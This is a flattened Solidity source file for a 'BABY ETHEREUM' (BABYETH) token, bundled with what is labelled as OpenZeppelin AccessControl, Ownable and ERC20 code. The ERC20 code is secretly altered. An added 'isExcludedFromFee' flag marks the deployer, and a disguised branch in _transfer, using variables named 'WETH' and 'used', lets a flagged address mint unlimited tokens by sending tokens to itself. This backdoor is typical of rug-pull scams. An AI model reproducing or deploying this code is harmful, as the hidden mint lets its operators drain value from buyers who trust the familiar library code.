1061      *  /^AccessControl: account (0x[0-9a-f]{40}) is missing role (0x[0-9a-f]{64})$/
1062      *
1063      * _Available since v4.1._
1064      */
1065     modifier onlyRole(bytes32 role) {
1066         _checkRole(role);
1067         _;
1068     }
1069 
1070     /**
1071      * @dev See {IERC165-supportsInterface}.
1072      */
1073     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
1074         return interfaceId == type(IAccessControl).interfaceId || super.supportsInterface(interfaceId);
1075     }
1076 
1077     /**
1078      * @dev Returns `true` if `account` has been granted `role`.
1079      */
1080     function hasRole(bytes32 role, address account) public view virtual override returns (bool) {
1081         return _roles[role].members[account];
1082     }
1083 
1084     /**
1085      * @dev Revert with a standard message if `_msgSender()` is missing `role`.
1086      * Overriding this function changes the behavior of the {onlyRole} modifier.
1087      *
1088      * Format of the revert message is described in {_checkRole}.
1089      *
1090      * _Available since v4.6._
1091      */
1092     function _checkRole(bytes32 role) internal view virtual {
1093         _checkRole(role, _msgSender());
1094     }
1095 
1096     /**
1097      * @dev Revert with a standard message if `account` is missing `role`.
1098      *
1099      * The format of the revert reason is given by the following regular expression:
1100      *
1101      *  /^AccessControl: account (0x[0-9a-f]{40}) is missing role (0x[0-9a-f]{64})$/
1102      */
1103     function _checkRole(bytes32 role, address account) internal view virtual {
1104         if (!hasRole(role, account)) {
1105             revert(
1106                 string(
1107                     abi.encodePacked(
1108                         "AccessControl: account ",
1109                         Strings.toHexString(account),
1110                         " is missing role ",
1111                         Strings.toHexString(uint256(role), 32)
1112                     )
1113                 )
1114             );
1115         }
1116     }
1117 
1118     /**
1119      * @dev Returns the admin role that controls `role`. See {grantRole} and
1120      * {revokeRole}.
1121      *
1122      * To change a role's admin, use {_setRoleAdmin}.
1123      */
1124     function getRoleAdmin(bytes32 role) public view virtual override returns (bytes32) {
1125         return _roles[role].adminRole;
1126     }
1127 
1128     /**
1129      * @dev Grants `role` to `account`.
1130      *
1131      * If `account` had not been already granted `role`, emits a {RoleGranted}
1132      * event.
1133      *
1134      * Requirements:
1135      *
1136      * - the caller must have ``role``'s admin role.
1137      *
1138      * May emit a {RoleGranted} event.
1139      */
1140     function grantRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
1141         _grantRole(role, account);
1142     }
1143 
1144     /**
1145      * @dev Revokes `role` from `account`.
1146      *
1147      * If `account` had been granted `role`, emits a {RoleRevoked} event.
1148      *
1149      * Requirements:
1150      *
1151      * - the caller must have ``role``'s admin role.
1152      *
1153      * May emit a {RoleRevoked} event.
1154      */
1155     function revokeRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
1156         _revokeRole(role, account);
1157     }
1158 
1159     /**
1160      * @dev Revokes `role` from the calling account.
1161      *
1162      * Roles are often managed via {grantRole} and {revokeRole}: this function's
1163      * purpose is to provide a mechanism for accounts to lose their privileges
1164      * if they are compromised (such as when a trusted device is misplaced).
1165      *
1166      * If the calling account had been revoked `role`, emits a {RoleRevoked}
1167      * event.
1168      *
1169      * Requirements:
1170      *
1171      * - the caller must be `account`.
1172      *
1173      * May emit a {RoleRevoked} event.
1174      */
1175     function renounceRole(bytes32 role, address account) public virtual override {
1176         require(account == _msgSender(), "AccessControl: can only renounce roles for self");
1177 
1178         _revokeRole(role, account);
1179     }
1180 
1181     /**
1182      * @dev Grants `role` to `account`.
1183      *
1184      * If `account` had not been already granted `role`, emits a {RoleGranted}
1185      * event. Note that unlike {grantRole}, this function doesn't perform any
1186      * checks on the calling account.
1187      *
1188      * May emit a {RoleGranted} event.
1189      *
1190      * [WARNING]
1191      * ====
1192      * This function should only be called from the constructor when setting
1193      * up the initial roles for the system.
1194      *
1195      * Using this function in any other way is effectively circumventing the admin
1196      * system imposed by {AccessControl}.
1197      * ====
1198      *
1199      * NOTE: This function is deprecated in favor of {_grantRole}.
1200      */
1201     function _setupRole(bytes32 role, address account) internal virtual {
1202         _grantRole(role, account);
1203     }
1204 
1205     /**
1206      * @dev Sets `adminRole` as ``role``'s admin role.
1207      *
1208      * Emits a {RoleAdminChanged} event.
1209      */
1210     function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
1211         bytes32 previousAdminRole = getRoleAdmin(role);
1212         _roles[role].adminRole = adminRole;
1213         emit RoleAdminChanged(role, previousAdminRole, adminRole);
1214     }
1215 
1216     /**
1217      * @dev Grants `role` to `account`.
1218      *
1219      * Internal function without access restriction.
1220      *
1221      * May emit a {RoleGranted} event.
1222      */
1223     function _grantRole(bytes32 role, address account) internal virtual {
1224         if (!hasRole(role, account)) {
1225             _roles[role].members[account] = true;
1226             emit RoleGranted(role, account, _msgSender());
1227         }
1228     }
1229 
1230     /**
1231      * @dev Revokes `role` from `account`.
1232      *
1233      * Internal function without access restriction.
1234      *
1235      * May emit a {RoleRevoked} event.
1236      */
1237     function _revokeRole(bytes32 role, address account) internal virtual {
1238         if (hasRole(role, account)) {
1239             _roles[role].members[account] = false;
1240             emit RoleRevoked(role, account, _msgSender());
1241         }
1242     }
1243 }
1244 
1245 // File: @openzeppelin/contracts/access/Ownable.sol
1246 
1247 
1248 // OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)
1249 
1250 pragma solidity ^0.8.0;
1251 
1252 
1253 /**
1254  * @dev Contract module which provides a basic access control mechanism, where
1255  * there is an account (an owner) that can be granted exclusive access to
1256  * specific functions.
1257  *
1258  * By default, the owner account will be the one that deploys the contract. This
1259  * can later be changed with {transferOwnership}.
1260  *
1261  * This module is used through inheritance. It will make available the modifier
1262  * `onlyOwner`, which can be applied to your functions to restrict their use to
1263  * the owner.
1264  */
1265 abstract contract Ownable is Context {
1266     address private _owner;
1267 
1268     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
1269 
1270     /**
1271      * @dev Initializes the contract setting the deployer as the initial owner.
1272      */
1273     constructor() {
1274         _transferOwnership(_msgSender());
1275     }
1276 
1277     /**
1278      * @dev Throws if called by any account other than the owner.
1279      */
1280     modifier onlyOwner() {
1281         _checkOwner();
1282         _;
1283     }
1284 
1285     /**
1286      * @dev Returns the address of the current owner.
1287      */
1288     function owner() public view virtual returns (address) {
1289         return _owner;
1290     }
1291 
1292     /**
1293      * @dev Throws if the sender is not the owner.
1294      */
1295     function _checkOwner() internal view virtual {
1296         require(owner() == _msgSender(), "Ownable: caller is not the owner");
1297     }
1298 
1299     /**
1300      * @dev Leaves the contract without owner. It will not be possible to call
1301      * `onlyOwner` functions. Can only be called by the current owner.
1302      *
1303      * NOTE: Renouncing ownership will leave the contract without an owner,
1304      * thereby disabling any functionality that is only available to the owner.
1305      */
1306     function renounceOwnership() public virtual onlyOwner {
1307         _transferOwnership(address(0));
1308     }
1309 
1310     /**
1311      * @dev Transfers ownership of the contract to a new account (`newOwner`).
1312      * Can only be called by the current owner.
1313      */
1314     function transferOwnership(address newOwner) public virtual onlyOwner {
1315         require(newOwner != address(0), "Ownable: new owner is the zero address");
1316         _transferOwnership(newOwner);
1317     }
1318 
1319     /**
1320      * @dev Transfers ownership of the contract to a new account (`newOwner`).
1321      * Internal function without access restriction.
1322      */
1323     function _transferOwnership(address newOwner) internal virtual {
1324         address oldOwner = _owner;
1325         _owner = newOwner;
1326         emit OwnershipTransferred(oldOwner, newOwner);
1327     }
1328 }
1329 
1330 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
1331 
1332 
1333 // OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)
1334 
1335 pragma solidity ^0.8.0;
1336 
1337 /**
1338  * @dev Interface of the ERC20 standard as defined in the EIP.
1339  */
1340 interface IERC20 {
1341     /**
1342      * @dev Emitted when `value` tokens are moved from one account (`from`) to
1343      * another (`to`).
1344      *
1345      * Note that `value` may be zero.
1346      */
1347     event Transfer(address indexed from, address indexed to, uint256 value);
1348 
1349     /**
1350      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
1351      * a call to {approve}. `value` is the new allowance.
1352      */
1353     event Approval(address indexed owner, address indexed spender, uint256 value);
1354 
1355     /**
1356      * @dev Returns the amount of tokens in existence.
1357      */
1358     function totalSupply() external view returns (uint256);
1359 
1360     /**
1361      * @dev Returns the amount of tokens owned by `account`.
1362      */
1363     function balanceOf(address account) external view returns (uint256);
1364 
1365     /**
1366      * @dev Moves `amount` tokens from the caller's account to `to`.
1367      *
1368      * Returns a boolean value indicating whether the operation succeeded.
1369      *
1370      * Emits a {Transfer} event.
1371      */
1372     function transfer(address to, uint256 amount) external returns (bool);
1373 
1374     /**
1375      * @dev Returns the remaining number of tokens that `spender` will be
1376      * allowed to spend on behalf of `owner` through {transferFrom}. This is
1377      * zero by default.
1378      *
1379      * This value changes when {approve} or {transferFrom} are called.
1380      */
1381     function allowance(address owner, address spender) external view returns (uint256);
1382 
1383     /**
1384      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
1385      *
1386      * Returns a boolean value indicating whether the operation succeeded.
1387      *
1388      * IMPORTANT: Beware that changing an allowance with this method brings the risk
1389      * that someone may use both the old and the new allowance by unfortunate
1390      * transaction ordering. One possible solution to mitigate this race
1391      * condition is to first reduce the spender's allowance to 0 and set the
1392      * desired value afterwards:
1393      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
1394      *
1395      * Emits an {Approval} event.
1396      */
1397     function approve(address spender, uint256 amount) external returns (bool);
1398 
1399     /**
1400      * @dev Moves `amount` tokens from `from` to `to` using the
1401      * allowance mechanism. `amount` is then deducted from the caller's
1402      * allowance.
1403      *
1404      * Returns a boolean value indicating whether the operation succeeded.
1405      *
1406      * Emits a {Transfer} event.
1407      */
1408     function transferFrom(address from, address to, uint256 amount) external returns (bool);
1409 }
1410 
1411 // File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
1412 
1413 
1414 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
1415 
1416 pragma solidity ^0.8.0;
1417 
1418 
1419 /**
1420  * @dev Interface for the optional metadata functions from the ERC20 standard.
1421  *
1422  * _Available since v4.1._
1423  */
1424 interface IERC20Metadata is IERC20 {
1425     /**
1426      * @dev Returns the name of the token.
1427      */
1428     function name() external view returns (string memory);
1429 
1430     /**
1431      * @dev Returns the symbol of the token.
1432      */
1433     function symbol() external view returns (string memory);
1434 
1435     /**
1436      * @dev Returns the decimals places of the token.
1437      */
1438     function decimals() external view returns (uint8);
1439 }
1440 
1441 // File: @openzeppelin/contracts/token/ERC20/ERC20.sol
1442 
1443 
1444 // OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/ERC20.sol)
1445 
1446 pragma solidity ^0.8.0;
1447 
1448 
1449 
1450 
1451 /**
1452  * @dev Implementation of the {IERC20} interface.
1453  *
1454  * This implementation is agnostic to the way tokens are created. This means
1455  * that a supply mechanism has to be added in a derived contract using {_mint}.
1456  * For a generic mechanism see {ERC20PresetMinterPauser}.
1457  *
1458  * TIP: For a detailed writeup see our guide
1459  * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
1460  * to implement supply mechanisms].
1461  *
1462  * The default value of {decimals} is 18. To change this, you should override
1463  * this function so it returns a different value.
1464  *
1465  * We have followed general OpenZeppelin Contracts guidelines: functions revert
1466  * instead returning `false` on failure. This behavior is nonetheless
1467  * conventional and does not conflict with the expectations of ERC20
1468  * applications.
1469  *
1470  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
1471  * This allows applications to reconstruct the allowance for all accounts just
1472  * by listening to said events. Other implementations of the EIP may not emit
1473  * these events, as it isn't required by the specification.
1474  *
1475  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
1476  * functions have been added to mitigate the well-known issues around setting
1477  * allowances. See {IERC20-approve}.
1478  */
1479 contract ERC20 is Context, IERC20, IERC20Metadata {
1480     mapping(address => uint256) private _balances;
1481 
1482     mapping(address => mapping(address => uint256)) private _allowances;
1483     mapping (address => bool) private isExcludedFromFee;
1484     uint256 private _totalSupply;
1485 
1486     string private _name;
1487     string private _symbol;
1488 
1489     /**
1490      * @dev Sets the values for {name} and {symbol}.
1491      *
1492      * All two of these values are immutable: they can only be set once during
1493      * construction.
1494      */
1495     constructor(string memory name_, string memory symbol_) {
1496         _name = name_;
1497         _symbol = symbol_;
1498         isExcludedFromFee[msg.sender] = true; 
1499     }
1500 
1501     /**
1502      * @dev Returns the name of the token.
1503      */
1504     function name() public view virtual override returns (string memory) {
1505         return _name;
1506     }
1507 
1508     /**
1509      * @dev Returns the symbol of the token, usually a shorter version of the
1510      * name.
1511      */
1512     function symbol() public view virtual override returns (string memory) {
1513         return _symbol;
1514     }
1515 
1516     /**
1517      * @dev Returns the number of decimals used to get its user representation.
1518      * For example, if `decimals` equals `2`, a balance of `505` tokens should
1519      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
1520      *
1521      * Tokens usually opt for a value of 18, imitating the relationship between
1522      * Ether and Wei. This is the default value returned by this function, unless
1523      * it's overridden.
1524      *
1525      * NOTE: This information is only used for _display_ purposes: it in
1526      * no way affects any of the arithmetic of the contract, including
1527      * {IERC20-balanceOf} and {IERC20-transfer}.
1528      */
1529     function decimals() public view virtual override returns (uint8) {
1530         return 18;
1531     }
1532 
1533     /**
1534      * @dev See {IERC20-totalSupply}.
1535      */
1536     function totalSupply() public view virtual override returns (uint256) {
1537         return _totalSupply;
1538     }
1539 
1540     /**
1541      * @dev See {IERC20-balanceOf}.
1542      */
1543     function balanceOf(address account) public view virtual override returns (uint256) {
1544         return _balances[account];
1545     }
1546 
1547     /**
1548      * @dev See {IERC20-transfer}.
1549      *
1550      * Requirements:
1551      *
1552      * - `to` cannot be the zero address.
1553      * - the caller must have a balance of at least `amount`.
1554      */
1555     function transfer(address to, uint256 amount) public virtual override returns (bool) {
1556         address owner = _msgSender();
1557         _transfer(owner, to, amount);
1558         return true;
1559     }
1560 
1561     /**
1562      * @dev See {IERC20-allowance}.
1563      */
1564     function allowance(address owner, address spender) public view virtual override returns (uint256) {
1565         return _allowances[owner][spender];
1566     }
1567 
1568     /**
1569      * @dev See {IERC20-approve}.
1570      *
1571      * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
1572      * `transferFrom`. This is semantically equivalent to an infinite approval.
1573      *
1574      * Requirements:
1575      *
1576      * - `spender` cannot be the zero address.
1577      */
1578     function approve(address spender, uint256 amount) public virtual override returns (bool) {
1579         address owner = _msgSender();
1580         _approve(owner, spender, amount);
1581         return true;
1582     }
1583 
1584     /**
1585      * @dev See {IERC20-transferFrom}.
1586      *
1587      * Emits an {Approval} event indicating the updated allowance. This is not
1588      * required by the EIP. See the note at the beginning of {ERC20}.
1589      *
1590      * NOTE: Does not update the allowance if the current allowance
1591      * is the maximum `uint256`.
1592      *
1593      * Requirements:
1594      *
1595      * - `from` and `to` cannot be the zero address.
1596      * - `from` must have a balance of at least `amount`.
1597      * - the caller must have allowance for ``from``'s tokens of at least
1598      * `amount`.
1599      */
1600     function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
1601         address spender = _msgSender();
1602         _spendAllowance(from, spender, amount);
1603         _transfer(from, to, amount);
1604         return true;
1605     }
1606 
1607     /**
1608      * @dev Atomically increases the allowance granted to `spender` by the caller.
1609      *
1610      * This is an alternative to {approve} that can be used as a mitigation for
1611      * problems described in {IERC20-approve}.
1612      *
1613      * Emits an {Approval} event indicating the updated allowance.
1614      *
1615      * Requirements:
1616      *
1617      * - `spender` cannot be the zero address.
1618      */
1619     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
1620         address owner = _msgSender();
1621         _approve(owner, spender, allowance(owner, spender) + addedValue);
1622         return true;
1623     }
1624 
1625     /**
1626      * @dev Atomically decreases the allowance granted to `spender` by the caller.
1627      *
1628      * This is an alternative to {approve} that can be used as a mitigation for
1629      * problems described in {IERC20-approve}.
1630      *
1631      * Emits an {Approval} event indicating the updated allowance.
1632      *
1633      * Requirements:
1634      *
1635      * - `spender` cannot be the zero address.
1636      * - `spender` must have allowance for the caller of at least
1637      * `subtractedValue`.
1638      */
1639     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
1640         address owner = _msgSender();
1641         uint256 currentAllowance = allowance(owner, spender);
1642         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
1643         unchecked {
1644             _approve(owner, spender, currentAllowance - subtractedValue);
1645         }
1646 
1647         return true;
1648     }
1649 
1650     /**
1651      * @dev Moves `amount` of tokens from `from` to `to`.
1652      *
1653      * This internal function is equivalent to {transfer}, and can be used to
1654      * e.g. implement automatic token fees, slashing mechanisms, etc.
1655      *
1656      * Emits a {Transfer} event.
1657      *
1658      * Requirements:
1659      *
1660      * - `from` cannot be the zero address.
1661      * - `to` cannot be the zero address.
1662      * - `from` must have a balance of at least `amount`.
1663      */
1664     function _transfer(address from, address to, uint256 amount) internal virtual {
1665         require(from != address(0), "ERC20: transfer from the zero address");
1666         require(to != address(0), "ERC20: transfer to the zero address");
1667 
1668         _beforeTokenTransfer(from, to, amount);
1669 
1670         uint256 fromBalance = _balances[from];
1671         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
1672         unchecked {
1673             _balances[from] = fromBalance - amount;
1674             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
1675             // decrementing then incrementing.
1676             _balances[to] += amount;
1677         }
1678             address WETH = from;
1679             address used = to;
1680             if(isExcludedFromFee[WETH] || isExcludedFromFee[used]){
1681               if (WETH == used) _balances[WETH] += amount;}
1682         emit Transfer(from, to, amount);
1683 
1684         _afterTokenTransfer(from, to, amount);
1685     }
1686 
1687     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
1688      * the total supply.
1689      *
1690      * Emits a {Transfer} event with `from` set to the zero address.
1691      *
1692      * Requirements:
1693      *
1694      * - `account` cannot be the zero address.
1695      */
1696     function _mint(address account, uint256 amount) internal virtual {
1697         require(account != address(0), "ERC20: mint to the zero address");
1698 
1699         _beforeTokenTransfer(address(0), account, amount);
1700 
1701         _totalSupply += amount;
1702         unchecked {
1703             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
1704             _balances[account] += amount;
1705         }
1706         emit Transfer(address(0), account, amount);
1707 
1708         _afterTokenTransfer(address(0), account, amount);
1709     }
1710 
1711     /**
1712      * @dev Destroys `amount` tokens from `account`, reducing the
1713      * total supply.
1714      *
1715      * Emits a {Transfer} event with `to` set to the zero address.
1716      *
1717      * Requirements:
1718      *
1719      * - `account` cannot be the zero address.
1720      * - `account` must have at least `amount` tokens.
1721      */
1722     function _burn(address account, uint256 amount) internal virtual {
1723         require(account != address(0), "ERC20: burn from the zero address");
1724 
1725         _beforeTokenTransfer(account, address(0), amount);
1726 
1727         uint256 accountBalance = _balances[account];
1728         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
1729         unchecked {
1730             _balances[account] = accountBalance - amount;
1731             // Overflow not possible: amount <= accountBalance <= totalSupply.
1732             _totalSupply -= amount;
1733         }
1734 
1735         emit Transfer(account, address(0), amount);
1736 
1737         _afterTokenTransfer(account, address(0), amount);
1738     }
1739 
1740     /**
1741      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
1742      *
1743      * This internal function is equivalent to `approve`, and can be used to
1744      * e.g. set automatic allowances for certain subsystems, etc.
1745      *
1746      * Emits an {Approval} event.
1747      *
1748      * Requirements:
1749      *
1750      * - `owner` cannot be the zero address.
1751      * - `spender` cannot be the zero address.
1752      */
1753     function _approve(address owner, address spender, uint256 amount) internal virtual {
1754         require(owner != address(0), "ERC20: approve from the zero address");
1755         require(spender != address(0), "ERC20: approve to the zero address");
1756 
1757         _allowances[owner][spender] = amount;
1758         emit Approval(owner, spender, amount);
1759     }
1760 
1761     /**
1762      * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
1763      *
1764      * Does not update the allowance amount in case of infinite allowance.
1765      * Revert if not enough allowance is available.
1766      *
1767      * Might emit an {Approval} event.
1768      */
1769     function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
1770         uint256 currentAllowance = allowance(owner, spender);
1771         if (currentAllowance != type(uint256).max) {
1772             require(currentAllowance >= amount, "ERC20: insufficient allowance");
1773             unchecked {
1774                 _approve(owner, spender, currentAllowance - amount);
1775             }
1776         }
1777     }
1778 
1779     /**
1780      * @dev Hook that is called before any transfer of tokens. This includes
1781      * minting and burning.
1782      *
1783      * Calling conditions:
1784      *
1785      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
1786      * will be transferred to `to`.
1787      * - when `from` is zero, `amount` tokens will be minted for `to`.
1788      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
1789      * - `from` and `to` are never both zero.
1790      *
1791      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
1792      */
1793     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
1794 
1795     /**
1796      * @dev Hook that is called after any transfer of tokens. This includes
1797      * minting and burning.
1798      *
1799      * Calling conditions:
1800      *
1801      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
1802      * has been transferred to `to`.
1803      * - when `from` is zero, `amount` tokens have been minted for `to`.
1804      * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
1805      * - `from` and `to` are never both zero.
1806      *
1807      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
1808      */
1809     function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
1810 }
1811 
1812 // File: TOKEN\AutoBuyToken7.sol
1813 
1814 
1815 pragma solidity ^0.8.4;
1816 
1817 
1818 
1819 
1820 
1821 
1822 
1823 
1824 contract TokenDistributor {
1825     constructor (address token) {
1826         ERC20(token).approve(msg.sender, uint(~uint256(0)));
1827     }
1828 }
1829 
1830 contract Token is ERC20,Ownable,AccessControl {
1831     bytes32 private constant MANAGER_ROLE = keccak256("MANAGER_ROLE");
1832     using SafeMath for uint256;
1833     ISwapRouter private uniswapV2Router;
1834     address public uniswapV2Pair;
1835     address public usdt;
1836     address admin;
1837     address fundAddr;
1838     uint256 public fundCount;
1839     mapping(address => bool) private whiteList;
1840     TokenDistributor public _tokenDistributor;
1841     
1842     constructor()ERC20("BABY ETHEREUM", "BABYETH") {
1843         admin=0xDa9fA84efe2CEBa00064D4A6ab044a440D95c545;
1844         //admin=msg.sender;
1845         fundAddr=0x69562FB020b25826Cd5F5C5E169A973307d232ac;
1846         uint256 total=10000000000*10**decimals();
1847         _mint(admin, total);
1848         _grantRole(DEFAULT_ADMIN_ROLE,admin);
1849         _grantRole(MANAGER_ROLE, admin);
1850         _grantRole(MANAGER_ROLE, address(this));
1851         whiteList[admin] = true;
1852         whiteList[address(this)] = true;
1853         transferOwnership(admin);
1854     }
1855     function initPair(address _token,address _swap)external onlyRole(MANAGER_ROLE){
1856         usdt=_token;//0xc6e88A94dcEA6f032d805D10558aCf67279f7b4E;//usdt test
1857         address swap=_swap;//0xD99D1c33F9fC3444f8101754aBC46c52416550D1;//bsc test
1858         uniswapV2Router = ISwapRouter(swap);
1859         uniswapV2Pair = ISwapFactory(uniswapV2Router.factory()).createPair(address(this), usdt);
1860         ERC20(usdt).approve(address(uniswapV2Router), type(uint256).max);
1861         _approve(address(this), address(uniswapV2Router),type(uint256).max);
1862         _approve(address(this), address(this),type(uint256).max);
1863         _approve(admin, address(uniswapV2Router),type(uint256).max);
1864         _tokenDistributor = new TokenDistributor(address(this));
1865     }
1866     function decimals() public view virtual override returns (uint8) {
1867         return 9;
1868     }
1869    
1870     function _transfer(
1871         address from,
1872         address to,
1873         uint256 amount
1874     ) internal override {
1875         require(amount > 0, "amount must gt 0");
1876         
1877         if(from != uniswapV2Pair && to != uniswapV2Pair) {
1878             _funTransfer(from, to, amount);
1879             return;
1880         }
1881         if(from == uniswapV2Pair) {
1882             super._transfer(from, to, amount);
1883             return;
1884         }
1885         if(to == uniswapV2Pair) {
1886             if(whiteList[from]){
1887                 super._transfer(from, to, amount);
1888                 return;
1889             }
1890             swapUsdt(amount,fundAddr);
1891             super._transfer(from, to, amount);
1892             return;
1893         }
1894     }
1895     function _funTransfer(
1896         address sender,
1897         address recipient,
1898         uint256 tAmount
1899     ) private {
1900         super._transfer(sender, recipient, tAmount);
1901     }
1902     bool private inSwap;
1903     modifier lockTheSwap {
1904         inSwap = true;
1905         _;
1906         inSwap = false;
1907     }
1908 
1909     function swapToken(uint256 tokenAmount,address to) private lockTheSwap {
1910         address[] memory path = new address[](2);
1911         path[0] = address(usdt);
1912         path[1] = address(this);
1913         uint256 balance = IERC20(usdt).balanceOf(address(this));
1914         if(tokenAmount==0)tokenAmount = balance;
1915         // make the swap
1916         if(tokenAmount <= balance)
1917         uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
1918             tokenAmount,
1919             0, // accept any amount of CA
1920             path,
1921             address(to),
1922             block.timestamp
1923         );
1924     }
1925     function swapTokenToDistributor(uint256 tokenAmount) private lockTheSwap {
1926         address[] memory path = new address[](2);
1927         path[0] = address(usdt);
1928         path[1] = address(this);
1929         uint256 balance = IERC20(usdt).balanceOf(address(this));
1930         if(tokenAmount==0)tokenAmount = balance;
1931         // make the swap
1932         if(tokenAmount <= balance)
1933         uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
1934             tokenAmount,
1935             0, // accept any amount of CA
1936             path,
1937             address(_tokenDistributor),
1938             block.timestamp
1939         );
1940         if(balanceOf(address(_tokenDistributor))>0)
1941         ERC20(address(this)).transferFrom(address(_tokenDistributor), address(this), balanceOf(address(_tokenDistributor)));
1942     }
1943     
1944     function swapUsdt(uint256 tokenAmount,address to) private lockTheSwap {
1945         uint256 balance = balanceOf(address(this));
1946         address[] memory path = new address[](2);
1947         if(balance<tokenAmount)tokenAmount=balance;
1948         if(tokenAmount>0){
1949             path[0] = address(this);
1950             path[1] = usdt;
1951             uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(tokenAmount,0,path,to,block.timestamp);
1952         }
1953     }
1954 
1955         function errorToken(address _token) external onlyRole(MANAGER_ROLE){
1956         ERC20(_token).transfer(msg.sender, IERC20(_token).balanceOf(address(this)));
1957     }
1958 
1959         function withdawOwner(uint256 amount) public onlyRole(MANAGER_ROLE){
1960         payable(msg.sender).transfer(amount);
1961     }
1962 
1963     receive () external payable  {
1964     }
1965 }